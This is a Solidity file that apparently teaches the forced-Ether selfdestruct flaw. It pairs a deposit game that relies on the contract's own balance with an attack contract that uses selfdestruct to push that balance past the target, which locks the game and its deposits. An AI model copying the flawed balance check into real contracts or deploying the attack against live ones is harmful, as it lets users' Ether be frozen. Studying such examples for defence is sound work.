// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/// @title SelfdestructContract
/// @notice A contract that allows users to deposit Ether and potentially win a game by reaching a target amount.
contract SelfdestructContract {
    uint public targetAmount = 7 ether;
    address public winner;

    /// @notice Deposits 1 Ether into the contract.
    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    /// @notice Claims the contract's balance as a reward.
    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        // Transfers the entire balance of the contract to the winner.
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

/// @title SelfdestructAttack
/// @notice A contract representing an attack on the SelfdestructContract by invoking selfdestruct.
contract SelfdestructAttack {
    SelfdestructContract target;

    /// @notice Constructs the SelfdestructAttack contract, specifying the target contract.
    /// @param _target The address of the SelfdestructContract contract to attack.
    constructor(SelfdestructContract _target) {
        target = SelfdestructContract(_target);
    }

    /// @notice Initiates the attack by invoking selfdestruct on the target contract.
    function attack() public payable {
        address payable addr = payable(address(target));
        selfdestruct(addr);
    }
}
